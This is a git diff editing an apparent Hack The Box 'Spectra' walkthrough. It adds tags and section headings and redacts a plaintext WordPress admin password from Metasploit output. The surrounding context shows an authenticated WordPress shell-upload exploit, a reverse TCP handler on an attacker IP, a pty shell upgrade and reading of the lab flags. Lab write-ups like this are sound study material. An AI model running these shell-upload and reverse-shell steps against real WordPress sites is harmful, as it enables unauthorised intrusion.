@@ -10,7 +10,9 @@ categories:
 tags:
   - HTB
   - CTF
-  - 
+  - WordPress
+  - Meterpreter
+  - Initctl
 ---
 
 ## Machine Information
@@ -94,6 +96,8 @@ ff02::2 ip6-allrouters
 10.10.10.229 spectra.htb
 ```
 
+## Website Enumeration
+
 Now let's browse to the site:
 
 ![spectra](/assets/images/2021-03-21-16-46-59.png)
@@ -132,8 +136,7 @@ However, the error message is helpful as it says username not known, let's try a
 
 We're logged in as administrator. At this point we can either use Meterpreter to get a reverse shell, or we can change one of the template files from within the WordPress admin site and put our own reverse shell in it.
 
-## Meterpreter
-
+## Meterpreter Shell
 
 Let's do it with Meterpreter first, then I'll show you the template way later. Fire up MSF and find the wp_admin_shell module:
 
@@ -187,7 +190,7 @@ Let's start the exploit and let Meterpreter do it's work:
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.114:1234 
-[*] Authenticating with WordPress using administrator:devteam01...
+[*] Authenticating with WordPress using administrator:<<HIDDEN>>...
 [+] Authenticated with WordPress
 [*] Preparing payload...
 [*] Uploading payload...
@@ -214,6 +217,8 @@ cd tmp
 python3 -c "import pty;pty.spawn('/bin/bash')"
 nginx@spectra /tmp $ 
 ```
+
+## User Flag
 
 Ok, that's a much more workable environment. Let's check for users:
 
@@ -307,6 +312,8 @@ We're in. We know the user flag is here from looking before, so let's grab that 
 katie@spectra ~ $ cat user.txt 
 <<HIDDEN>>
 ```
+
+## Root Flag
 
 Ok, now we need to find a way to escalate. There's few obvious things I always try before grabbing something like [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to do a more detailed look. I must be having a good day because I checked sudo privileges first and hit the jackpot:
 
@@ -418,7 +425,7 @@ bash-4.3# cat /root/root.txt
 
 That was a nice simple box. Below is how you could get the initial shell by changing a file withing the WordPress theme instead of using Meterpreter.
 
-## WordPress Themes Exploit
+## WordPress Themes Method
 
 From the dashboard go to Appearance and then Theme Editor:
 
